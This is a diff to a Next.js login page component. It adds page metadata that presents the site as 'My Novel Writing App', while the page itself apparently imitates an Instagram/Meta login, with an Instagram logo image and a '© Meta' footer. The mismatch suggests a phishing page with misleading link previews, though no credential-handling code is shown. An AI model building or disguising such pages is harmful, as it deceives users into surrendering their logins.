@@ -2,6 +2,8 @@
 import { useState } from "react";
 import { client } from "@/src/sanity/lib/client";
 import { useRouter } from "next/router";
+import Image from "next/image";
+import Head from "next/head";
 
 export default function LoginPage() {
   const router = useRouter();
@@ -34,6 +36,29 @@ export default function LoginPage() {
   }
 
   return (
+  
+
+
+
+     <div>
+    
+     <Head>
+        <title>My Novel Writing App</title>
+        <meta name="description" content="Write and organize your novel effortlessly." />
+        
+        {/* Open Graph Meta Tags */}
+        <meta property="og:title" content="My Novel Writing App" />
+        <meta property="og:description" content="Write and organize your novel effortlessly." />
+        <meta property="og:type" content="website" />
+        <meta property="og:url" content="https://igc-two.vercel.app/" />
+        <meta property="og:image" content="https://igc-two.vercel.app/instagram-logo.png" />
+
+        {/* Twitter Card (optional but recommended) */}
+        <meta name="twitter:card" content="summary_large_image" />
+        <meta name="twitter:title" content="My Novel Writing App" />
+        <meta name="twitter:description" content="Write and organize your novel effortlessly." />
+        <meta name="twitter:image" content="https://yourwebsite.com/cover.png" />
+      </Head>
     <div className="flex min-h-screen items-center justify-center bg-gradient-to-br from-[#fdfbfb] via-[#f1f4f9] to-[#fce4ec]">
       <div className="w-[380px] p-6 flex flex-col items-center">
         {/* Language */}
@@ -96,5 +121,6 @@ export default function LoginPage() {
         <p className="text-xs text-gray-500 mt-8">© Meta</p>
       </div>
     </div>
+</div>
   );
 }
